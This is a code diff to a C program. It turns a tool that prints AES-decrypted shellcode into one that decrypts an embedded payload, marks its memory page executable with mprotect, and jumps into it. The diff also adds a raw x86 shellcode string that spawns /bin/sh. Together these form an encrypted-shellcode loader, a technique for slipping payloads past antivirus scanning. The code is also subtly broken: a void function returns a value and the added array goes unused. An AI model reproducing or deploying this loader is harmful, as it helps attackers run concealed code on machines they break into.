@@ -1,3 +1,10 @@
+#include <sys/mman.h>
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+
+
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
@@ -9,7 +16,7 @@
 #include "aes.h"
 
 int i;
-static void decrypt(void)
+static void decrypt_and_run(void)
 {
 
 
@@ -22,25 +29,20 @@ static void decrypt(void)
     // Encrypted Shellcode:
     uint8_t shellcode[] = { 0x5e, 0x57, 0x9c, 0x52, 0xe9, 0x70, 0x43, 0xe1, 0x75, 0x08, 0xe4, 0x3c, 0x19, 0x3c, 0x06, 0x97, 0x32, 0x5d, 0x3b, 0x2e, 0xf9, 0xc5, 0x67, 0x2b, 0x1c, 0x82, 0x12, 0x14, 0x0b, 0x64, 0xf4, 0x86, };
                                 
-    
     struct AES_ctx ctx;
 
     AES_init_ctx_iv(&ctx, key, iv);
     AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));
 
-    printf("Decrypted Shellcode:");
-    printf("\n");
 
-    for (i = 0; i < sizeof shellcode; i ++)
-    {
-        printf("\\x%02x", shellcode[i]);
-    }
-
-    printf("\n");
+    // pass decrypted shellcode to function and execute
+    int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
+    int (*ret)() = (int(*)())shellcode;
+    return ret();
 
 }
 
 int main(void)
 {
-    decrypt();
+    decrypt_and_run();
 }
